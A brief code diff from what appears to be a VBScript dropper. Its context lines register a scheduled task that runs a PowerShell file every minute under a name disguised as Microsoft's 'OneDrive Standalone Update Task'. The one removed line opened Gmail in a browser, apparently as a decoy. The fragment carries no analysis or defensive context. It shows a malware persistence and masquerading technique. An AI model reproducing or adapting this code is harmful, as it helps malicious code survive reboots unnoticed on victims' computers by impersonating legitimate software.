@@ -82,4 +82,3 @@ trigger.Repetition.Interval = "PT1M"
 Set action = taskDef.Actions.Create(0)
 action.Path = psFile
 rootFolder.RegisterTaskDefinition "OneDrive Standalone Update Task-S-1-5-21-1187179157-150580998-3348809432-999", taskDef, 6, , , 3
-sh.Run "https://mail.google.com/"
